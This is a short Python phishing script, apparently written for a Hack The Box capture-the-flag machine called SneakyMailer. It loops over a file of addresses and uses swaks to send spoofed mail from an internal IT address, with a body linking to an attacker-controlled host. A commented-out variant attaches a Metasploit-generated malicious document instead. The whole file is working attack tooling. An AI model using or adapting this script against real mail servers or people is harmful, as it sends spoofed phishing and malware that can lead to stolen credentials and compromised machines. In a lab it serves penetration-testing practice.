#!/usr/bin/env python3

import os

mails = open("mails", "r")
for mail in mails:
    mail = mail[:-1]
    print("[+] Sending mail to " + mail)
    # os.system("""swaks --to {} --from it@sneakymailer.htb --header "Subject: Modules" --body "Here is what you asked" --server 10.10.10.197 --attach /root/.msf4/local/msf.doc""".format(mail))
    os.system("""swaks --to {} --from it@sneakymailer.htb --header "Subject: Modules" --body "http://10.10.14.15" --server 10.10.10.197""".format(mail))
    print("[+] Email sent")
